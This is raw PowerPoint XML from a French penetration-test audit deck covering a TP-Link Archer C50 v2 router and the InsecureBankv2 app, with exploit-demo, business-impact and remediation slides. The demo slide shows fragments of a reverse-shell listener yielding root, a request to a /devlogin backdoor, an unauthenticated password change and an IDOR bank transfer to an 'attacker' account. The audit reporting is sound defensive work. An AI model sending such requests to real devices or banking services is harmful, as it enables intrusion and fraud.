            <a:off x="320040" y="10058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Démonstrations réalisées en environnement contrôlé — résultats vérifiés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="85039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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="1115568" cy="107899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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="149047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EXP-01</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1810512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600" b="1" noProof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CVSS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" b="1" noProof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8.6</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="1408176"/>
            <a:ext cx="7178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CVE-2025-15517</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="1572768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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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Firmware Upload RCE — TP-Link Archer C50 v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1150" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="1874520"/>
            <a:ext cx="717804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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="1901952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50" noProof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 -lvnp 4444  →  [connexion root reçue depuis 192.168.x.x]  →  # id → uid=0(root)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2542032"/>
            <a:ext cx="85039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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2542032"/>
            <a:ext cx="1115568" cy="107899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0" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="267919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EXP-02</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2999232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600" b="1" noProof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CVSS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" b="1" noProof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9.8</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="2596896"/>
            <a:ext cx="7178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— Backdoor</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="2761488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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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Backdoor /devlogin — accès développeur sans credentials</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1150" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="3063240"/>
            <a:ext cx="717804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5" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="3090672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50" noProof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http://host:8888/devlogin -d 'username=devadmin'  →  {"token":"dev_..."}</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3730752"/>
            <a:ext cx="85039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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3730752"/>
            <a:ext cx="1115568" cy="107899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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="386791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EXP-03</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4187952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600" b="1" noProof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CVSS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1600" b="1" noProof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9.1</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1600" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="3785616"/>
            <a:ext cx="7178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+ V3 — IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="3950208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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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Bypass auth /changepassword + IDOR virement bancaire</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1150" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1527048" y="4251960"/>
            <a:ext cx="717804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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4279392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50" noProof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/changepassword  username=victim&amp;newpassword=hacked  →  "Change Password Successful"</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="850" noProof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/dotransfer  from_acc=[n'importe quel compte]&amp;to_acc=attacker&amp;amount=99999</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 3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6" name="Text 3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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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IMPACT BUSINESS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Conséquences concrètes &amp; risques de conformité</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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financier, réglementaire et réputationnel pour le client Banking</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="2788920" cy="53035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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393192" y="140817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00" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="FFCCCC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Fraude</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs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8872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Détournement de fonds</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="429768" y="2011680"/>
            <a:ext cx="2578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 /dotransfer — virements non autorisés depuis n'importe quel compte client sans détection</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="1353312"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="1353312"/>
            <a:ext cx="2788920" cy="53035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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="140817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00" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="FFCCCC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Prise de</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"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fr-FR" sz="800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFCCCC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>contrôle</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" b="1" noProof="0">
              <a:solidFill>
                <a:srgbClr val="FFCCCC"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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133088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Verrouillage comptes</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3374136" y="2011680"/>
            <a:ext cx="2578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 /changepassword — modification des mots de passe de tous les clients sans authentification</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1353312"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1353312"/>
            <a:ext cx="2788920" cy="53035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2" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="140817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00" b="1" noProof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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="800" b="1" noProof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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7077456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Compromission infrastructure</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6318504" y="2011680"/>
            <a:ext cx="2578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CVE-2025-15517 — shell root sur le routeur bancaire, pivot vers tout le réseau LAN</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3072384"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3072384"/>
            <a:ext cx="2788920" cy="53035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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393192" y="312724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00" b="1" noProof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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720" y="31821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Violation données clients</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="429768" y="3730752"/>
            <a:ext cx="2578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Fuite credentials bancaires en HTTP clair + Logcat — sanctions RGPD potentielles (4% CA)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="3072384"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264408" y="3072384"/>
            <a:ext cx="2788920" cy="53035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2" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3337560" y="312724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00" b="1" noProof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PCI-DSS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4133088" y="31821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Non-conformité paiement</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3374136" y="3730752"/>
            <a:ext cx="2578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de paiement non chiffrées, pas de SCA — risque suspension des droits de traitement</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3072384"/>
            <a:ext cx="27889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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3072384"/>
            <a:ext cx="2788920" cy="5303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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="312724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00" b="1" noProof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Réputation</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7077456" y="31821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Atteinte à l'image</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1100" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6318504" y="3730752"/>
            <a:ext cx="2578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 publique possible depuis l'APK téléchargeable — couverture médiatique négative</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40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43" name="Text 4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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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07a — RECOMMANDATIONS</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Actions immédiates &amp; court terme</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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Correctifs prioritaires à déployer en urgence — Patch d'urgence requis sur 5 points</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="548640" cy="53035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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312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fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="1444752"/>
            <a:ext cx="960120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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="14447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0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IMMÉDIAT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="167335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0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— CVSS 9.8</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="1426464"/>
            <a:ext cx="6382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la backdoor /devlogin et le compte devadmin dans DoLogin.java. Auditer tous les Endpoints non documentés. Patch d'urgence requis.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1956816"/>
            <a:ext cx="8503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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1956816"/>
            <a:ext cx="548640" cy="53035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9" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1956816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fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="2048256"/>
            <a:ext cx="960120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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="204825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0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IMMÉDIAT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="800" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
